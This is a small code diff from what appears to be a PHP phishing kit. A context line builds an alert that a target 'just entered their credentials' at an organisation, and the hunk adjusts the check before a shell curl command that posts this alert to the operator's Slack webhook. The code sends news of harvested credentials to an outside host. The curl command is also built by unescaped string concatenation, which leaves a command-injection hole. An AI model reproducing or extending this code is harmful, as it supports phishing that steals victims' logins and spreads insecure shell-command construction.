@@ -238,7 +238,7 @@ $messagediscord = "> ".$target." just entered their credentials at ".$org."! (["
 
 }
 
-if($SlackWebHook != ""){
+if($slackurl != ""){
 
 // Send to Slack
 $cmd = 'curl -s -X POST --data-urlencode \'payload={"channel": "'.$slackchannel.'", "username": "'.$slackbotname.'", "text": "'.$message.'", "icon_emoji": "'.$slackemoji.'"}\' '.$slackurl.'';
